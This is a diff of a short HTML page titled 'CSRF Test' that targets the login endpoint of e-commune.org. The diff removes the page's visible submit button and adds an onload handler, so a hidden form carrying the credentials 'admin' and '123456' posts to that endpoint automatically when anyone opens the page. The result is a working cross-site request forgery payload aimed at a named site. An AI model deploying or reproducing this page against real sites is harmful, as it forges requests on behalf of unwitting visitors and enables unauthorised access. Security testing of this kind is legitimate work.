@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Test CSRF</title>
+  <title>CSRF Test</title>
 </head>
-<body>
-  <h2>Simulation d'une attaque CSRF</h2>
-  <form action="https://www.e-commune.org/login.php" method="POST">
+<body onload="document.forms[0].submit();">
+  <form action="https://e-commune.org/login.php" method="POST">
     <input type="hidden" name="login" value="admin" />
     <input type="hidden" name="pass" value="123456" />
-    <input type="submit" value="Lancer la requête" />
   </form>
 </body>
 </html>
+
 
